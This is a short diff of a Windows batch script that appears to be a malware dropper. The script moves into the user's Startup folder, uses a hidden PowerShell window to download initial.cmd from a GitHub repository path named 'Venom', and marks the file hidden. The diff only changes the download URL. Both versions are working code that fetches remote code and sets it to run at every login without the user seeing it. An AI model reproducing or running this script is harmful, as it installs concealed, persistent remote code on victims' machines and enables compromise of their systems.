@@ -5,7 +5,7 @@ set "STARTUP=C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 
 cd %STARTUP%
 
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/initial.cmd -OutFile initial.cmd"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/initial.cmd -OutFile initial.cmd"
 
 attrib +h "%STARTUP%/initial.cmd"
 
